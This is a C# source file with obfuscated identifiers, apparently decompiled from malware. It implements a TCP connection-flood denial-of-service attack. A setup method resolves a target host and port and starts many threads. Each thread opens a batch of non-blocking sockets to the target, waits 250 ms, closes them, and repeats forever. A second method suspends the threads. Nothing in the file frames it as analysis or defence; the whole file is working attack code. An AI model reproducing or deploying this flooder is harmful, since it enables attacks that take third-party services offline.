using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class wUmymjdvsQzKQMYopLNWtbF
{
	private class tRYfKWWlpskJYRBilGimBxg
	{
		private IPEndPoint FlPeLRksiOJKINxrycEoFJL;

		private Socket[] DcFjUQEZPGUeNNzmNjwLrKv;

		private int zZNLFXUqNlrnyCRmnxHCfuO;

		public tRYfKWWlpskJYRBilGimBxg(IPEndPoint iBvlRZaYdPIPtGFVZcTsIBk, int SVpSWkuPdQDdzybJaMQpQbV)
		{
			FlPeLRksiOJKINxrycEoFJL = iBvlRZaYdPIPtGFVZcTsIBk;
			zZNLFXUqNlrnyCRmnxHCfuO = SVpSWkuPdQDdzybJaMQpQbV;
		}

		public void nkHdCtpCThDqzXSvxeyEMCh(IAsyncResult ar)
		{
		}

		public void Send()
		{
			checked
			{
				while (true)
				{
					try
					{
						DcFjUQEZPGUeNNzmNjwLrKv = new Socket[zZNLFXUqNlrnyCRmnxHCfuO - 1 + 1];
						int num = zZNLFXUqNlrnyCRmnxHCfuO - 1;
						for (int i = 0; i <= num; i++)
						{
							DcFjUQEZPGUeNNzmNjwLrKv[i] = new Socket(FlPeLRksiOJKINxrycEoFJL.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							DcFjUQEZPGUeNNzmNjwLrKv[i].Blocking = false;
							AsyncCallback callback = nkHdCtpCThDqzXSvxeyEMCh;
							DcFjUQEZPGUeNNzmNjwLrKv[i].BeginConnect(FlPeLRksiOJKINxrycEoFJL, callback, DcFjUQEZPGUeNNzmNjwLrKv[i]);
						}
						Thread.Sleep(250);
						int num2 = zZNLFXUqNlrnyCRmnxHCfuO - 1;
						for (int i = 0; i <= num2; i++)
						{
							if (DcFjUQEZPGUeNNzmNjwLrKv[i].Connected)
							{
								DcFjUQEZPGUeNNzmNjwLrKv[i].Disconnect(reuseSocket: false);
							}
							DcFjUQEZPGUeNNzmNjwLrKv[i].Close();
							DcFjUQEZPGUeNNzmNjwLrKv[i] = null;
						}
						DcFjUQEZPGUeNNzmNjwLrKv = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						int num3 = zZNLFXUqNlrnyCRmnxHCfuO - 1;
						for (int i = 0; i <= num3; i++)
						{
							try
							{
								if (DcFjUQEZPGUeNNzmNjwLrKv[i].Connected)
								{
									DcFjUQEZPGUeNNzmNjwLrKv[i].Disconnect(reuseSocket: false);
								}
								DcFjUQEZPGUeNNzmNjwLrKv[i].Close();
								DcFjUQEZPGUeNNzmNjwLrKv[i] = null;
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	private static ThreadStart[] UBHaiYEyyxDngnSseuxBsRu;

	private static Thread[] ZJFtOFvJTDCpbDZlzhykoPD;

	public static string BuNKgCbgcorHcdmwrVkDXql;

	private static IPEndPoint aGPQOTEwEivuLPRJixpaIKe;

	public static int SWkuPdQDdzybJaMQpQbVnkH;

	private static tRYfKWWlpskJYRBilGimBxg[] dCtpCThDqzXSvxeyEMChqqo;

	public static int tTTuDPrLqOgGgrlEnKtFKHS;

	public static int jxGHQoiMOuBUcSxstrwhovM;

	public static void nmDsumMoTRynIypEOwvjjLT()
	{
		try
		{
			aGPQOTEwEivuLPRJixpaIKe = new IPEndPoint(Dns.GetHostEntry(BuNKgCbgcorHcdmwrVkDXql).AddressList[0], SWkuPdQDdzybJaMQpQbVnkH);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			aGPQOTEwEivuLPRJixpaIKe = new IPEndPoint(IPAddress.Parse(BuNKgCbgcorHcdmwrVkDXql), SWkuPdQDdzybJaMQpQbVnkH);
			ProjectData.ClearProjectError();
		}
		checked
		{
			ZJFtOFvJTDCpbDZlzhykoPD = new Thread[jxGHQoiMOuBUcSxstrwhovM - 1 + 1];
			UBHaiYEyyxDngnSseuxBsRu = new ThreadStart[jxGHQoiMOuBUcSxstrwhovM - 1 + 1];
			dCtpCThDqzXSvxeyEMChqqo = new tRYfKWWlpskJYRBilGimBxg[jxGHQoiMOuBUcSxstrwhovM - 1 + 1];
			int num = jxGHQoiMOuBUcSxstrwhovM - 1;
			for (int i = 0; i <= num; i++)
			{
				dCtpCThDqzXSvxeyEMChqqo[i] = new tRYfKWWlpskJYRBilGimBxg(aGPQOTEwEivuLPRJixpaIKe, tTTuDPrLqOgGgrlEnKtFKHS);
				UBHaiYEyyxDngnSseuxBsRu[i] = dCtpCThDqzXSvxeyEMChqqo[i].Send;
				ZJFtOFvJTDCpbDZlzhykoPD[i] = new Thread(UBHaiYEyyxDngnSseuxBsRu[i]);
				ZJFtOFvJTDCpbDZlzhykoPD[i].Start();
			}
		}
	}

	public static void fIbHfwJwuoHEaKVbXizBWXh()
	{
		checked
		{
			int num = jxGHQoiMOuBUcSxstrwhovM - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					ZJFtOFvJTDCpbDZlzhykoPD[i].Suspend();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ZJFtOFvJTDCpbDZlzhykoPD[i].Suspend();
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
